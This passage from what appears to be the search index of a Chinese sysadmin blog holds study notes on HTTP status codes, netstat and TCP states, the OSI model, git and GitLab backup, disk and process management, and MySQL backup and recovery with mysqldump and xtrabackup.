jokes被定义的在RFC2324，超文本咖啡罐控制协议，但是并没有被实际的HTTP服务器实现。RFC指定了这个代码应该是由茶罐返回给速溶咖啡。 419 （认证超时）并不是HTTP标注的一部分，419认证超时表示以前的有效证明已经失效了。同时也被用于401未认证的替代选择为了从其它被拒绝访问的已认证客户端中指定服务器的资源。 420 （方法失效）不是HTTP的标准，但是被Spring定义在HTTP状态类中当方法失时使用。这个状态码已经不推荐在Spring中使用。 420 （提高你的耐心）也不是HTTP标准的一部分，但是被版本1的Twitter搜索和趋势APi返回当客户端的速率被限制的时候。其它的服务提供商可能会使用429太多的请求响应码来代替。 421 从当前客户端所在的IP地址到服务器的连接数超过了服务器许可的最大范围。通常，这里的IP地址指的是从服务器上看到的客户端地址（比如用户的网关或者代理服务器地址）。在这种情况下，连接数的计算可能涉及到不止一个终端用户。 422 请求格式正确，但是由于含有语义错误，无法响应。（RFC 4918 WebDAV）423 Locked当前资源被锁定。（RFC 4918 WebDAV） 424 由于之前的某个请求发生的错误，导致当前请求失败，例如 PROPPATCH。（RFC 4918 WebDAV） 425 在WebDav Advanced Collections 草案中定义，但是未出现在《WebDAV 顺序集协议》（RFC 3658）中。 426 客户端应当切换到TLS/1.0。（RFC 2817） 428 (需要前置条件)原始服务器需要有条件的请求。当客户端GET一个资源的状态的时候，同时又PUT回给服务器，与此同时第三方修改状态到服务器上的时候，为了避免丢失更新的问题发生将会导致冲突。 429 （过多请求）用户已经发送了太多的请求在指定的时间里。用于限制速率。 431 （请求头部字段太大）服务器由于一个单独的请求头部字段或者是全部的字段太大而不愿意处理请求。 440 （登陆超时（微软））一个微软的扩展，意味着你的会话已经超时。 444 （无响应）被使用在Nginx的日志中表明服务器没有返回信息给客户端并且关闭了连接（在威慑恶意软件的时候比较有用）。 449 （重试（微软））一个微软的扩展。请求应该在执行适当的动作之后被重试。 450 （被Windows家长控制阻塞（微软））一个微软的扩展。这个错误是当Windows家长控制打开并且阻塞指定网页的访问的时候被指定。 451 （由于法律原因而无效（因特网草稿））被定义在因特网草稿“一个新的HTTP状态码用于法律限制的资源”。被用于当资源的访问由于法律原因被禁止的时候。例如检查制度或者是政府强制要求禁止访问。一个例子是1953年dystopian的小说Fahrenheit 451就是一个非法的资源。 451 （重定向（微软））被用在Exchange ActiveSync中如果一个更有效的服务器能够被使用或者是服务器不能访问用户的邮箱。客户端会假定重新执行HTTP自动发现协议去寻找更适合的服务器。 494 （请求头太大（Nginx））Nginx内置代码和431类似，但是是被更早地引入在版本0.9.4（在2011年1月21日）。 495 （证书错误（Nginx））Nginx内置的代码，当使用SSL客户端证书的时候错误会出现为了在日志错误中区分它和4XX和一个错误页","date":"2022-07-05","objectID":"/posts/linux/http%E5%93%8D%E5%BA%94%E7%A0%81/:0:0","tags":["linux","http"],"title":"HTTP响应码","uri":"/posts/linux/http%E5%93%8D%E5%BA%94%E7%A0%81/"},{"categories":["linux","运维记事"],"content":"Netstat命令/TCP链路状态","date":"2022-07-05","objectID":"/posts/linux/netstat%E5%91%BD%E4%BB%A4/","tags":["linux","netstat","tcp"],"title":"Netstat命令","uri":"/posts/linux/netstat%E5%91%BD%E4%BB%A4/"},{"categories":["linux","运维记事"],"content":"netstat 命令 netstat列含义： Proto: 协议名（tcp协议或者udp协议) recv-Q: 网络接收队列 表示收到的数据已经在本地接收缓冲，但是还有多少没有被进程取走，recv() 如果接收队列Recv-Q一直处于阻塞状态，可能是遭受了拒绝服务 denial-of-service 攻击。 Send-Q: 网路发送队列 对方没有收到的数据或者说没有Ack的,还是本地缓冲区. 如果发送队列Send-Q不能很快的清零，可能是有应用向外发送数据包过快，或者是对方接收数据包不够快。 Recv-Q和Send-Q通常应该为0，如果不为0可能是有问题的。packets在两个队列里都不应该有堆积状态。可接受短暂的非0情况。 Local Address: 本地监听地址和端口号 Foreign Address: 与本机端口通信的外部socket。显示规则与Local Address相同 State: 链路状态，共有11种 LISTEN： 侦听状态，等待远程机器的连接请求。 CLOSED: 初始（无连接）状态。 SYN_SEND: 尝试建立一个连接,在TCP三次握手期间，主动连接端发送了SYN包后，进入SYN_SEND状态，等待对方的ACK包。 SYN_RECV: 已经接受到了一个连接请求,在TCP三次握手期间，主动连接端收到SYN包后，进入SYN_RECV状态。 ESTABLISHED: 已经有一个有效连接，完成TCP三次握手后，主动连接端进入ESTABLISHED状态。此时，TCP连接已经建立，可以进行通信。 FIN_WAIT_1: 等待远程TCP的连接中断请求或先前的连接中断请求的确认，在TCP四次挥手时，主动关闭端发送FIN包后，进入FIN_WAIT_1状态。 FIN_WAIT_2: 从远程TCP等待连接中断请求 ,在TCP四次挥手时，主动关闭端收到ACK包后，进入FIN_WAIT_2状态。 TIME_WAIT: 等待足够的时间以确保远程TCP接收到连接中断请求的确认, 在TCP四次挥手时，主动关闭端发送了ACK包之后，进入TIME_WAIT状态，等待最多MSL时间，让被动关闭端收到ACK包。 CLOSING: 等待远程TCP对连接中断的确认, 在TCP四次挥手期间，主动关闭端发送了FIN包后，没有收到对应的ACK包，却收到对方的FIN包，此时，进入CLOSING状态。 CLOSE_WAIT: 等待从本地用户发来的连接中断请求,在TCP四次挥手期间，被动关闭端收到FIN包后，进入CLOSE_WAIT状态。 LAST_ACK：等待原来发向远程TCP的连接中断请求的确,在TCP四次挥手时，被动关闭端发送FIN包后，进入LAST_ACK状态，等待对方的ACK包。 netstat -i 列说明 Iface: 接口名 MTU: 网络最大传输单元(字节),大部分网络设备都是1500。如果本机的MTU比网关的MTU大，大的数据包就会被拆开来传送，这样会产生很多数据包碎片，增加丢包率，降低网络速度。把本机的MTU设成比网关的MTU小或相同，就可以减少丢包 https://www.cnblogs.com/wjoyxt/p/6873714.html。 RX-OK/TX-OK: 正确接收了多少数据包，发送了多少数据包 RX-ERR/TX-ERR: 接收、发送数据包的时候，丢弃了多少数据包 RX-OVR/TX-OVR: 由于错误遗失了多少数据包 Flg: 标记 L: 代表回环地址 R: 这个网络接口正在运行中 U: 接口正在处于活动中 B: 设置了广播地址 M: 接收所有数据包 O: 表示在该接口上禁止arp P: 端对端的连接 ","date":"2022-07-05","objectID":"/posts/linux/netstat%E5%91%BD%E4%BB%A4/:0:0","tags":["linux","netstat","tcp"],"title":"Netstat命令","uri":"/posts/linux/netstat%E5%91%BD%E4%BB%A4/"},{"categories":["linux","运维记事"],"content":"OSI七层模型/tcp","date":"2022-07-05","objectID":"/posts/linux/osi%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/","tags":["linux","tcp"],"title":"OSI七层模型","uri":"/posts/linux/osi%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/"},{"categories":["linux","运维记事"],"content":"OSI 模型是从上往下的，越底层越接近硬件，越往上越接近软件，这七层模型分别是物理层、数据链路层、网络层、传输层、会话层、表示层、应用层 物理层: 在媒体上传输比特，提供机械的和电气的规约 数据链路层: 将分组数据封装成帧，提供节点到节点方式的传输 网络层: 将分组从源端传送到目的端，提供网络互联 传输层: 提供可靠的端到端的报文传输和差错控制 会话层: 建立、管理和终止会话 表示层: 对数据进行转换、加密和压缩 应用层: 程序及接口 OSI七层模型 TCP/IP4层模型 功能 TCP/IP协议簇 应用层 应用层 文件传输、邮件、文件共享、虚拟终端、web、域名服务 TFTP、HTTP、SMTP、DNS、TELNET 表示层 应用层 数据格式化、代码转化、数据加密 没有协议 会话层 应用层 解除或建立与别的节点的会话关系 没有协议 传输层 传输层 提供端对端的接口 TCP、UDP 网络层 网络层 为数据包选择路由(路由器) IP、ICMP、RIP、OSPF、BGP、IGMP 数据链路层 链路层 传输有地址的帧及错误检测功能 SLIP、CSLIP、PPP、ARP、RARP、MTU(交换机) 物理层 链路层 以二进制数据形式在物理媒介上传输数据(光纤、普通网线、无线信号) ISO2110、IEEE802、IEEE802.2 OSI模型 全流程职责 当你输⼊⼀个⽹址并按下回⻋键的时候，⾸先，应⽤层协议对该请求包做了格式定义；紧接着传 输层协议加上了双⽅的端⼝号，确认了双⽅通信的应⽤程序；然后⽹络协议加上了双⽅的IP地 址，确认了双⽅的⽹络位置；最后链路层协议加上了双⽅的MAC地址，确认了双⽅的物理位置， 同时将数据进⾏分组，形成数据帧，采⽤⼴播⽅式，通过传输介质发送给对⽅主机。⽽对于不同 ⽹段，该数据包⾸先会转发给⽹关路由器，经过多次转发后，最终被发送到⽬标主机。⽬标机接 收到数据包后，采⽤对应的协议，对帧数据进⾏组装，然后再通过⼀层⼀层的协议进⾏解析，最 终被应⽤层的协议解析并交给服务器处理。 链路层: 对0和1进行分组，定义数据帧，确认主机的物理地址，传输数据； 网络层: 定义IP地址，确认主机所在的网络位置，并通过IP进行mac寻址，对外网数据包进行路由转发。 传输层: 定义端口，确认主机上应用程序身份，并将数据包交给对应的应用程序。 应用层: 定义数据格式，并按照对应的数据格式解读数据。 一条消息如何发送到目标电脑上的 应用层录入消息hello(写信) 传输层附加TCP包首部(装入信封) 网络层附加IP包首部(写入地址和邮编) IP数据包:首部(20字节:包含版本、首部长度、区分服务、总长度、标识、标志、片偏移、生存时间、协议、首部校验、源地址、目标地址、可选字段、填充、数据部分) + 数据(最大65515字节) 数据链路层附加以太包首部(邮票和邮章) 以太网协议: 一组电信号就是一个数据包，一个数据包又被称为一帧 以太网包,包含目标mac、源mac地址 物理层传通过光缆将数据输至目标(邮车转移) 数据链路层拆解以太包首部 网络层拆解IP包首部 传输层拆解TCP包首部 应用层接收消息 网络地址分类 特殊B类地址网段: 169.254.0.0/16, 用于处理DHCP分配失败或没有DHCP服务的情况 共有地址 A类: 1.0.0.0-126.0.0.0,默认子网掩码:255.0.0.0 ,第一个字节为网络号，后三个字节为主机号。该类ip地址的最前面为0,所以地址的网络号取值于1-126之间。一般用于大型网络。 B类: 128.0.0.0-191.255.0.0,默认子网掩码:255.255.0.0，前两个字节未网络号，后两个字节为主机号，该类IP 地址的最前面为10,所以地址的网络号取值于128-191之间，一般用于中等规模网络。 C类: 192.0.0.0-223.255.255.0,默认子网掩码: 255.255.255.0 ,前三个字节为网络号，最后一个字节为主机号，该类IP地址的最前面为110,所以地址的网络号取值于192-223之间，一般用于小型网络. D类: 是多播地址，该类IP地址的最前面为1110,所以地址的网络号取值于224-239之间，一般用于多路广播用户。 E类: 是保留地址。该类IP地址的最前面为1111,所以地址的网络号取值于240-255之间。 私有地址 A类: 10.0.0.0-10.255.255.255 B类: 172.16.0.0-172.31.255.255 C类: 192.168.0.0-192.168.255.255 TCP 包常见标识 SYN: 表示建立连接 FIN: 表示关闭连接 ACK: 表示响应 PSH: 表示有data数据传输 PST: 表示连接重置 三次握手 客户端发送SYN到服务器端表示准备建立连接，服务端响应发送SYN+ACK于客户端表示准备建立连接请求，客户端发送ACK响应表示开始传输数据 四次挥手 客户端发送FIN请求到服务端表示准备断开连接，同时进入FIN_WAIT_1状态下，服务端接收到FIN后发送ACK于客户端表示接收到了准备断开的响应请求，同时进入CLOSE_WAIT,客户端接收到了ACK同时进入FIN_WAIT_2，服务端再次发送FIN+ACK于客户端表示我也准备断开请求了，同时服务端进入LAST_ACK,客户端在接收到FIN+ACK后发送ACK到服务端，表示我已经接收到服务端确认并准备关闭连接，服务端接收到客户端ACK后直接关闭，客户端在发送后进入CLOSE_WAIT并等待2个报文长度时间(默认30秒)后关闭连接。 ","date":"2022-07-05","objectID":"/posts/linux/osi%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/:0:0","tags":["linux","tcp"],"title":"OSI七层模型","uri":"/posts/linux/osi%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/"},{"categories":["linux","运维记事"],"content":"持续集成","date":"2022-07-05","objectID":"/posts/linux/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/","tags":["linux","git","devops"],"title":"持续集成","uri":"/posts/linux/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/"},{"categories":["linux","运维记事"],"content":"持续集成 什么是DevOps DevOps 是一个框架，是一种理论方法，并不是一套工具，他包括一系列的基本原则和实践。其核心价值着重于更快速的交付，响应市场的变化。更多的关注业务的改进与提升。 git 工作目录-暂存区域(git add)-本地仓库(git commit)-远程仓库(git push) 初始配置 $\u003e git config --global user.name 0x5c0f $\u003e git config --global user.email mail@0x5c0f.cc $\u003e cat ~/.gitconfig # 系统层面位于/etc/ 下 ; 项目层面，项目根目录 [user] name = 0x5c0f email = mail@0x5c0f.cc $\u003e git config --list user.name=0x5c0f user.email=mail@0x5c0f.cc 初始项目 基础操作 $\u003e mkdir /data/gittest -p \u0026\u0026 cd /data/gittest $\u003e git init $\u003e tree -a . └── .git ├── branches ├── config ├── description ├── HEAD ├── hooks ...... ├── objects │ ├── info │ └── pack ...... # 移除缓冲区文件 $\u003e git rm --cached \u003cfile\u003e # 移除本地及缓冲区文件 $\u003e git rm -f \u003cfile\u003e # 重命名 $\u003e mv \u003cfile\u003e \u003cfile\u003e.txt $\u003e git rm --cached \u003cfile\u003e $\u003e git add \u003cfile\u003e.txt # git commit -m \"\" # 查看修改详情 $\u003e git diff \u003cfile\u003e # 查看提交历史 $\u003e git log # 查看提交历史(精简) $\u003e git log --oneline # 撤回修改文件(未add时) $\u003e git checkout -- \u003cfile\u003e # 撤回修改文件(未commit时) $\u003e git reset HEAD \u003cfile\u003e # git checkout -- \u003cfile\u003e # 撤回修改文件(未push时) $\u003e git reset --hard \u003ccommitid\u003e # 查看历史操作记录 # 此命令大体执行在git reset --hard \u003ccommitid\u003e 之后，因为执行了git reset --hard \u003ccommitid\u003e后，git log将不再看到commitid之后的所有提交记录 $\u003e git reflog 分支 分支创建后，直接增删，各个分支不受影响 # 创建分支 $\u003e git branch test01 # 删除 git branch -d test01 # 查看分支 $\u003e git branch * master test01 # 切换分支 $\u003e git checkout test01 # git status # git log --oneline --decorate # 合并分支(比如：合并test01到master中，则当前需要切换到master中执行) # 当两个分支中，同时修改了一个文件，则会出现合并冲突，此时需要手动处理冲突文件 $\u003e git merge test01 标签 标签可以作为一个commitid的惟一标记，相当于给commitid取的别名吧 # 给当前commit创建标签 $\u003e git tag v1.0 # git tag -a v1.0 # -a: 打开注释编辑页面 可使用-m \"message\"替代 # 针对特定commit打标签 $\u003e git tag v1.0 \u003ccommitid\u003e # 查看所有标签 $\u003e git tag # 查看当前标签的详细信息 $\u003e git show v1.0 # 删除标签 $\u003e git tag -d v1.0 # 重置到某个标签(提交点) $\u003e git reset --hard v1.0 # or git reset --hard \u003ccommit\u003e 远程推送(gitlab) $\u003e git remote add origin http://xxxxxxx/xxx.git $\u003e git push -u origin master ## gitlab 备份(/etc/gitlab.rb) # 备份路径 gitlab_rails['backup_path'] = '/data/backup' # 备份保留时间(秒) gitlab_rails['backup_keep_time'] = 604800 # 执行备份 $\u003e /usr/bin/gitlab-rake gitlab:backup:create # 数据恢复 # 停止数据写入服务 $\u003e gitlab-ctl stop unicorn $\u003e gitlab-ctl stop sidekiq $\u003e gitlab-rake gitlab:backup:restore BACKUP=\u003c备份文件的数字部分\u003e # 回车一路yes $\u003e gitlab-ctl restart ","date":"2022-07-05","objectID":"/posts/linux/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/:0:0","tags":["linux","git","devops"],"title":"持续集成","uri":"/posts/linux/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/"},{"categories":["linux"],"content":"磁盘管理","date":"2022-07-05","objectID":"/posts/linux/%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/","tags":["linux","硬盘"],"title":"磁盘管理(半草稿)","uri":"/posts/linux/%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/"},{"categories":["linux"],"content":"磁盘管理 磁盘的最小存储单位是扇区，大小为0.5kb(512Bytes)，多个连续的扇区称之为块 操作系统文件存取的最小单位是块(block)，为8个连续扇区,大小是8 x 0.5 = 4kb,即使文件小于4k,也会占用4k 硬件设备 IDE硬盘: /dev/hd[a-d] SCSI/SATA硬盘: /dev/sd[a-d] 软盘: /dev/fd[0-1] 打印机: /dev/lp[0-2] 鼠标: /dev/psaux /dev/mouse 软硬链接 软连接: 类似windowns的快捷方式 硬链接: inode一致 mount 命令 mount -o 参数详情 `async` 以异步的方式处理文件系统IO，加速写入，数据不会同步写入到磁盘，而是写入到一个缓冲区，提供系统性能，但损失安全性。 `sync` 所有的IO操着同步处理，数据同步写入到磁盘，性能较弱，但安全性提高 `atime/noatime` 文件被访问的时候，是否修改其时间戳，大量文件可以提升IO速度 `auto/noauto` 时候自动挂载 `defaults` 默认包含`rw`,`suid`,`dev`,`exec`,`auto`,`nouser`,`async等等` `exec/noexec` 是否允许挂载点内的可执行文件执行命令，只是禁止了从当前目录运行,并未禁止通过指定`bash`解释器来运行 `ro` 只读 `rw` 读写 buffer cache buffer: 用于写入数据的缓冲 cache: 用于读取数据时的缓存 #　raid https://support.hp.com/cn-zh/document/c01193785 raid 0 : 100%利用存储空间。最少需要两块盘(据说一块也可以，不过个人觉得一块应该没啥用)， 没用冗余数据，不做备份，任何一块磁盘损坏都无法运行。理论读写是单块磁盘的n倍。存储性能最好，但安全性不高。 raid 1: 50%的利用空间，磁盘最小需要2n块,总空间以最小盘为准，镜像同步数据，理论读取速度不受影响，甚至更快一点，写入速度受影响，更换盘后需要长时间的镜像同步，但外部读取读写不受影响。 raid 3: 至少需要3块盘，最后一块盘用于存储奇偶校验数据(专用的奇偶校验)，空间利用率n - 1, 可用性、成本和性能折中，但由于需要奇偶校验，因此速度较慢。 raid 5: 和raid 3类似,也是至少需要3块盘，每个奇偶校验数据是存储于每一个相同的数据块(分布式存储奇偶校验数据) raid 10: raid 0 + raid 1,又称为raid 01 ","date":"2022-07-05","objectID":"/posts/linux/%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/:0:0","tags":["linux","硬盘"],"title":"磁盘管理(半草稿)","uri":"/posts/linux/%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/"},{"categories":["linux"],"content":"系统管理","date":"2022-07-05","objectID":"/posts/linux/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/","tags":["linux","系统"],"title":"系统管理","uri":"/posts/linux/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/"},{"categories":["linux"],"content":"1. 进程与线程 进程: 一个程序的执行实例，也就是正在执行的程序 线程: 在一个程序里的一个执行路线就叫做线程 2. ps 命令 -f : 显示UID、PID、PPID、C(使用cpu资源百分比)、STIME(进程运行的开始时间)、TTY、TIME(进程使用的cpu总时长)、CMD栏位。 ps aux|head -n 2 %CPU: cpu使用率 %MEM： 内存使用率 VSZ: 表示进程分配的虚拟内存(kb) RSS: 表示进程分配了多少内存（RAM中的物理内存），RSS不包含已经被换出的内存。RSS包含了它所链接的动态库并且被加载到物理内存中的内存。RSS还包含栈内存和堆内存。 (kb) STAT: 表示当前进程状态 S: 进程休眠中，可被唤醒; s: 当前进程含有子进程 ; R: 当前进程运行中; D: 不可中断的进程； T：进程暂停状态; Z:僵尸进程; \u003c 高优先级进程 ; N:低优先级进程 START: 进程开始时间 TIME： 进程执行时间 3. top 命令 z: 打开或关闭颜色 k: 终止一个进程 i: 忽略闲置和僵死进程 r: 重新安排一个进程的优先级别 s: 改变两次刷新之间的延迟时间（单位为s） t: 切换显示进程和CPU状态信息 c: 切换显示命令名称和完整命令行 M: 根据驻留内存大小进行排序 P: 根据CPU使用百分比大小进行排序 x: 高亮某一列 4. 进程检查 4.1. pgrep 显示相关进程ID 4.2. kill 特殊信号 0 表示不发送任何信号给PID,但会对这个id进行检查，如果执行结果为0,表示次进程存在，如果结果为1,则表示进程不存在 4.3. 特殊进程 孤儿进程：一个父进程退出，而它的一个或多个子进程还在运行，那么那些子进程将成为孤儿进程。孤儿进程将被init进程(进程号为1)所收养，并由init进程对它们完成状态收集工作。 僵尸进程：一个进程使用fork创建子进程，如果子进程退出，而父进程并没有调用wait或waitpid获取子进程的状态信息，那么子进程的进程描述符仍然保存在系统中。这种进程称之为僵死进程。 参数详解 https://segmentfault.com/a/1190000008322093 http://blog.itpub.net/29270124/viewspace-2639162/ 5. top列说明 序号 列名 含义 a PID 进程id b PPID 父进程id c RUSER Real user name d UID 进程所有者的用户id e USER 进程所有者的用户名 f GROUP 进程所有者的组名 g TTY 启动进程的终端名。不是从终端启动的进程则显示为 ? h PR 优先级 i NI nice值。负值表示高优先级，正值表示低优先级 j P 最后使用的CPU，仅在多CPU环境下有意义 k %CPU 上次更新到现在的CPU时间占用百分比 l TIME 进程使用的CPU时间总计，单位秒 m TIME + 进程使用的CPU时间总计，单位1/100秒 n %MEM 进程使用的物理内存百分比 o VIRT 进程使用的虚拟内存总量，单位kb。VIRT=SWAP+RES p SWAP 进程使用的虚拟内存中，被换出的大小，单位kb。 q RES 进程使用的、未被换出的物理内存大小，单位kb。RES=CODE+DATA r CODE 可执行代码占用的物理内存大小，单位kb s DATA 可执行代码以外的部分(数据段+栈)占用的物理内存大小，单位kb t SHR 共享内存大小，单位kb u nFLT 页面错误次数 v nDRT 最后一次写入到现在，被修改过的页面数。 w S 进程状态(D=不可中断的睡眠状态,R=运行,S=睡眠,T=跟踪/停止,Z=僵尸进程) x COMMAND 命令名/命令行 y WCHAN 若该进程在睡眠，则显示睡眠中的系统函数名 z Flags 任务标志，参考 sched.h top 展示列表说明 - 当前时间 总共运行时间 当前系统登陆用户 系统平均负载(正常水平不超过: 核心数x每个核心的线程x0.8) 1分钟 5分钟 15分钟 top 14:33:32 up 1:38 1 user load average 1.84 1.81 1.48 - 当前运行的进程 总共进程 正在运行的进程 休眠进程 停止进程 僵死进程 Tasks - 390 total 1 running 388 sleeping 0 stopped 1 zombie - cpu使用占用百分比 用户态 内核态 用户进程空间内改变过优先级的进程 空闲进程 等待输入输出 硬中断 软中断 虚拟机 %Cpu(s) - 5.0 us 1.5 sy 0.0 ni 93.0 id 0.0 wa 0.4 hi 0.1 si 0.0 st - 物理内存总大小 空间的内存总量 使用中的内存总量 缓存的内存总量 MiB Mem 23324.9 total 13501.5 free 4962.2 used 4861.1 buff/cache MiB Swap 交换区总量 空闲交换区总量 使用的交换区总量 可用内存总量 - 4096.0 total 4096.0 free 0.0 used 17387.7 avail Mem PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND - - 进程优先级 nice值，数字越大优先级越低，反之越高 进程使用的虚拟内存总量，单位kb。VIRT=SWAP+RES 任务使用的非交换物理内存 任务使用的共享内存量。它只是反映了可能与其他进程共享的内存 任务的状态，可以是(D:不间断睡眠;R:运行;S:睡眠;T:暂停;Z:僵尸) 总CPU时间的百分比 任务当前使用的可用物理内存共享 任务自启动以来使用的总CPU时间 - ","date":"2022-07-05","objectID":"/posts/linux/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/:0:0","tags":["linux","系统"],"title":"系统管理","uri":"/posts/linux/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/"},{"categories":["linux","运维记事"],"content":"备份与恢复","date":"2022-06-28","objectID":"/posts/mysql/%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/","tags":["linux","mysql","解决方案"],"title":"Mysql 备份与恢复","uri":"/posts/mysql/%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/"},{"categories":["linux","运维记事"],"content":"mysql 备份与恢复 数据更新过程，例如 update 语句 写redo log，进入 prepare阶段(xtrabackup备份最低应处于该阶段 ) 写binlog落盘 redo log完成 commit 备份类型 冷备份: 关闭数据，停止业务 温备份: 加锁备份 热备份: 在线备份，不影响业务 备份方式 逻辑备份: 基于sql语句的备份 mysqldump: 建库、建表、数据插入语句 基于二进制日志: 数据库的所有变化类的操作 基于复制的备份: 将二进制日志实时传送到另一台机器并且恢复 物理备份: xtrabackup进行物理备份 拷贝数据文件(冷备) 备份工具 mysqldump mysql原生自带的逻辑备份工具 优点是备份结果是sql语句，都是文本格式，便于查看即压缩, 缺点是效率较慢 mysqldump -A -R --triggers --master-data=2 --single-transaction | gzip \u003e /data/backup_all.sql.gz 参数: -A: 全库备份(会备份mysql库) mysqldump -uroot -pxxx -A \u003e backup.sql -B： 增加建库(create)即\"use 库“的语句，可以直接连接多个库名，同时备份多个库-B 库1 库2 -R: 备份存储过程和函数数据 --triggers: 备份触发器数据 -F: 在备份是自动刷新一个二进制日志,方便将来二进制日志截取时的起点 --master-data=2: 告诉你备份时刻的binlog日志位置,一般选择2,以注释形式记录二进制日志的位置 -x, --lock-all-tables: 锁定所有表(锁表只会影响增删改,不会影响查询),保证整个数据库（所有schema）的数据具有一致性快照,一般不建议使用 -l, --lock-tables: 保证各个schema具有数据一致性快照 --single-transaction: 对innodb引擎进行热备 备份恢复: -- 方法一 --- mysql -uroot \u003c /data/backup_all.sql -- 方法二(建议使用) mysql\u003e set sql_log_bin=0 mysql\u003e source /data/backup_all.sql ... mysql\u003e mysqldump备份恢复案例: -- 每天晚上有全备份,第二天早上误删除一个表 -- 恢复思路 --- 1. 断开业务,防止二次伤害(挂出维护页面) --- 2. 搭建备用库 --- 3. 截取昨天晚上全备时间到早上删除之前的日志 --- 4. 恢复到备用库,验证数据完整性 --- 5. 两种方案恢复前端应用 ---- 5.1. 备用库导出误删表到生产库 ---- 5.2. 直接切换到备用库 -- 具体操作 --- 1. 获取全备时刻的binlog号(:22) --- -- CHANGE MASTER TO MASTER_LOG_FILE='mysql-bin.000039', MASTER_LOG_POS=183021; --- 2. 截取binlog从全备到删除时刻的binlog号 此处不能和前面交错截取，不然可能会出问题 mysql\u003e show binlog events in 'mysql-bin.000002'; -- end: 183014 $\u003e mysqlbinlog --no-defaults --start-position=183021 --stop-position=183014 /data/mysql56/3307/data/mysql-bin/mysql-bin.000039 \u003e\u003e /data/binlog.sql --- 临时关闭二进制日志信息 mysql\u003e set sql_log_bin=0 mysql\u003e source /data/backup_all.sql mysql\u003e source /data/binlog.sql mysql\u003e set sql_log_bin=1 --- binlog自动清理 mysql\u003e show variables like '%expire%'; mysql\u003e set global expire_logs_days=8; -- 一般设置为全备+1天 -- 永久生效 -- /etc/my.cnf -- expire_logs_days=8 -- 手动清理二进制文件 mysql\u003e purge binary logs before now() - interval 3 day; -- 3 天前 mysql\u003e purage binary logs to 'mysql-bin.000010'; -- 删除到 -- 不要手动 rm mysql-bin.00000x 文件，否则会出现问题，解决方案 -- 1. 关闭 my.cnf binlog相关参数，删除mysql-bin.index文件,启动数据库 -- 2. 关闭数据库，开启binlog相关参数，启动数据库 -- 滚动一个新的日志(重启会自动滚动一个日志) mysql\u003e flush logs; mysqlbinlog 实现binlog备份的原生命令 xtrabackup precona公司开发的性能很高的物理备份工具(热备) 备份方式: 拷贝数据文件 拷贝数据页 备份原理(innoDB): 对于innoDB表,可以实现热备 在数据还有修改操作的时候,直接将数据文件中的数据页备份(应该是相当于磁盘块),此时,备份走的数据对于当前mysql来讲是不一致的 将备份过程中的redo和undo一并备走 为了恢复的时候,只要保证备份出来的数据页LSN能和redo LSN匹配,将来恢复的就是一致的数据. redo应用和undo的应用 对于myisam表实现自动说表拷贝文件 xtrabackup 安装使用: XtraBackup 2.4/8.0 版本区别 通过查到可知 XtraBackup 2.4 与 8.0 版本备份记录信息有如下不同点： 2.4 备份生成的 xtrabackup_binlog_info 文件记录的 GTID 信息是准确的，但是备份恢复后 show master status 显示的 GTID 是不准确的； 8.0 备份的实例中只有 InnoDB 表时，xtrabackup_binlog_info 文件记录的 GTID 信息不一定是准确的，但是备份恢复后 show master status 显示的 GTID 是准确的； 8.0 备份的实例中有非 InnoDB 表时，xtrabackup_binlog_info 文件记录的 GTID 信息是准确的，备份恢复后 show master status 显示的 GTID 也是准确的 # $\u003e wget https://downloads.percona.com/downloads/Percona-XtraBackup-2.4/Percona-XtraBackup-2.4.21/binary/redhat/7/x86_64/percona-xtrabackup-24-2.4.21-1.el7.x86_64.rpm $\u003e yum install -y percona-xtrabackup-24-2.4.21-1.el7.x86_64.rpm # 备份测试(需指定配置文件my.cnf、用户名、密码) $\u003e innobackupex /data/backup/ /data/backup/ └── 2021-01-19_16-01-57 ├── mysql ├── performance_schema ├── test ├── testdb01 ├── testdb02 └── world # 全备份，不使用时间戳为备份目录 $\u003e innobackupex --no-timestamp /data/backup/full 2 [error opening dir] /data/backup/full ├── mysql ├── performance_schema ├── test ├── testdb01 ├── testdb02 └── world # 全备恢复示例 # 1. 恢复数据前的准备(合并xtabackup_log_file和备份的物理文件) $\u003e innobackupex --apply-log --use-memory=32M /data/backup/full/ # 2. 模拟故障 (停止数据库，删除数据) # 3. 恢复数据 ## 3.1 直接复制全备数据进去即可(恢复时，需要确认数据路径为空，且数据库必须停止),单库直接复制测试可行 $\u003e cp -a /data/backup/full/* /data/mysql56/3307/data/ ## 3.2 命令复制 $\u003e innobackupex --copy-back /data/backup/full/ # 增量备份 ## 增量备份是基于全备开始 ## 1. 周一全备 $\u003e innobackupex --no-timestamp /data/backup/full ## 数据写入 ## 2. 周二增量备份 基于那个全备进行增量备份 $\u003e innobackupex --incremental --no-timestamp --incremental-basedir=/data/backup/full /data/backup/inc1 ## 数据写入 ## 3. 周三增量备份 基于那个备份","date":"2022-06-28","objectID":"/posts/mysql/%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/:0:0","tags":["linux","mysql","解决方案"],"title":"Mysql 备份与恢复","uri":"/posts/mysql/%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/"},{"categories":["linux","运维记事"],"content":"Mysql 存储引擎","date":"2022-06-28","objectID":"/posts/mysql/%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/","tags":["linux","mysql"],"title":"Mysql 